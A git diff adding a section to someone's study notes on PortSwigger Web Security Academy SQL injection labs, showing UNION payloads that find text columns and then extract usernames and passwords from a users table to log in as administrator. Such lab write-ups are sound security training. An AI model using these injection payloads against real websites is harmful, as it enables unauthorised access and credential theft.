@@ -52,7 +52,15 @@
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,'a'--` (Server Error, means this column accepting text value)
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,'a',NULL--` ('a' determine that the 2nd column accepting text value)
 
-## Lab 6: 
+## Lab 6: SQL injection UNION attack, retrieving data from other tables [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)
+
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified: `SELECT * FROM products WHERE category = 'Gifts'UNION+SELECT+username,password+FROM+users--` This should return all the users available in USERS table. (Since, table and columns name were given in Lab description. We can take it from there)
+- Login > Enter the Administrator Cred > Done
+- ![image](https://github.com/user-attachments/assets/003e7533-e7c9-401d-824d-fe7c7a34fe98)
+
+
+## Lab 7: [Link]()
 
 
 
